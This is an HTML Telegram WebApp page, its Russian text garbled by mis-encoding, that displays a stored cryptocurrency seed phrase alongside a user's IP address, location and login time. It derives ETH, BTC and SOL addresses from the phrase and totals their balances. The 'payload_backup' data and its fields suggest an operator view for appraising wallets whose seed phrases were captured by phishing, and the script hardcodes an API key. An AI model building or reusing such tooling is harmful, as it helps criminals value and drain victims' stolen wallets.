<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>–ü—Ä–æ—Ñ–∏–ª—å –∫–æ—à–µ–ª—å–∫–∞</title>

  <!-- Telegram WebApp -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>

  <!-- –ë—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.browser.min.js"></script>

  <style>
    body {
      font-family: monospace;
      padding: 20px;
      background: #0d1117;
      color: #e6edf3;
    }
    .container {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      padding: 30px;
    }
    h1 {
      text-align: center;
      color: #00ffae;
    }
    .label {
      font-weight: bold;
      margin-top: 15px;
    }
    #seed {
      width: 100%;
      height: 80px;
      background: #0e131a;
      color: #e6edf3;
      border: 1px dashed #30363d;
      border-radius: 8px;
      padding: 10px;
      margin-top: 10px;
      font-size: 14px;
    }
    button {
      margin-top: 20px;
      padding: 12px;
      width: 100%;
      background: #00ffae;
      color: black;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üëõ –ü—Ä–æ—Ñ–∏–ª—å –∫–æ—à–µ–ª—å–∫–∞</h1>
    <p class="label">ETH –∞–¥—Ä–µ—Å: <span id="ethAddress">‚Äì</span></p>
    <p class="label">BTC –∞–¥—Ä–µ—Å: <span id="btcAddress">‚Äì</span></p>
    <p class="label">SOL –∞–¥—Ä–µ—Å: <span id="solAddress">‚Äì</span></p>
    <p class="label">–î–∞—Ç–∞ –≤—Ö–æ–¥–∞: <span id="timestamp">‚Äì</span></p>
    <p class="label">IP: <span id="userIp">‚Äì</span></p>
    <p class="label">–õ–æ–∫–∞—Ü–∏—è: <span id="userLocation">‚Äì</span></p>
    <p class="label">–û–±—â–∏–π –±–∞–ª–∞–Ω—Å: <span id="walletBalance">‚è≥ –ó–∞–≥—Ä—É–∑–∫–∞‚Ä¶</span></p>
    <p class="label">Seed-—Ñ—Ä–∞–∑–∞:</p>
    <textarea id="seed" readonly></textarea>
    <button id="goWalletBtn">üîÅ –ü–µ—Ä–µ–π—Ç–∏ –≤ –∫–æ—à–µ–ª—ë–∫</button>
  </div>

  <script>
    const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
    const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");

    const seedPhrase = (data.seed || "").trim();
    const walletType = (data.wallet || "").toLowerCase();
    const timestamp = data.timestamp || "‚Äì";
    const ip = data.ip || "‚Äì";
    const locationInfo = data.location || "‚Äì";

    document.getElementById("timestamp").textContent = timestamp;
    document.getElementById("userIp").textContent = ip;
    document.getElementById("userLocation").textContent = locationInfo;
    document.getElementById("seed").value = seedPhrase;

    const supported = [
      { coin: "ethereum", symbol: "ETH", chain: "ethereum", key: "eth" },
      { coin: "bitcoin", symbol: "BTC", chain: "bitcoin", key: "btc" },
      { coin: "solana", symbol: "SOL", chain: "solana", key: "sol" }
    ];

    const addresses = { eth: null, btc: null, sol: null };

    async function deriveAddresses(mnemonic) {
      if (!mnemonic) throw new Error("Seed –ø—É—Å—Ç–æ–π");

      // ETH
      const ethWallet = ethers.Wallet.fromMnemonic(mnemonic);
      addresses.eth = ethWallet.address;
      document.getElementById("ethAddress").textContent = addresses.eth;

      // BTC
      const seed = await bip39.mnemonicToSeed(mnemonic);
      const root = bitcoin.bip32.fromSeed(seed);
      const child = root.derivePath("m/44'/0'/0'/0/0");
      addresses.btc = bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
      document.getElementById("btcAddress").textContent = addresses.btc;

      // SOL
      const solKey = seed.slice(0, 32);
      const solAddress = solanaWeb3.Keypair.fromSeed(solKey).publicKey.toBase58();
      addresses.sol = solAddress;
      document.getElementById("solAddress").textContent = addresses.sol;
    }

    async function fetchPrices() {
      const ids = supported.map(c => c.coin).join(",");
      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`;
      const res = await fetch(url);
      return await res.json();
    }

    async function fetchBalance(chain, address) {
      try {
        if (chain === "ethereum") {
          const res = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`);
          const json = await res.json();
          return parseFloat(json.result) / 1e18;
        } else if (chain === "bitcoin") {
          const res = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
          const text = await res.text();
          return parseFloat(text || 0) / 1e8;
        } else if (chain === "solana") {
          const res = await fetch("https://api.mainnet-beta.solana.com", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              jsonrpc: "2.0",
              id: 1,
              method: "getBalance",
              params: [address]
            })
          });
          const json = await res.json();
          return parseFloat(json.result?.value || 0) / 1e9;
        }
      } catch (err) {
        console.warn("Balance error:", err.message);
        return 0;
      }
    }

    async function calculateTotalETH() {
      const prices = await fetchPrices();
      let totalETH = 0;

      for (const token of supported) {
        const addr = addresses[token.key];
        if (!addr) continue;
        const bal = await fetchBalance(token.chain, addr);
        const rate = prices[token.coin]?.eth || 0;
        totalETH += bal * rate;
      }

      document.getElementById("walletBalance").textContent = `${totalETH.toFixed(6)} ETH`;
    }

    function goToWallet() {
      let url = "https://www.google.com";
      if (walletType.includes("metamask")) url = "https://metamask.io/";
      else if (walletType.includes("trust")) url = "https://trustwallet.com/";
      else if (walletType.includes("phantom")) url = "https://phantom.app/";
      else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
      else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";

      if (window.Telegram && Telegram.WebApp) {
        Telegram.WebApp.openLink(url);
      } else {
        window.open(url, "_blank");
      }
    }

    document.getElementById("goWalletBtn").addEventListener("click", goToWallet);

    document.addEventListener("DOMContentLoaded", async () => {
      try {
        if (typeof bip39 === "undefined") throw new Error("‚ùå bip39 –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω");
        if (!seedPhrase) throw new Error("‚ùå Seed –Ω–µ –Ω–∞–π–¥–µ–Ω");

        await deriveAddresses(seedPhrase);
        await calculateTotalETH();
        console.log("‚úÖ –í—Å–µ –≥–æ—Ç–æ–≤–æ");
      } catch (err) {
        console.error("–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏:", err.message);
      }
    });
  </script>
</body>
</html>
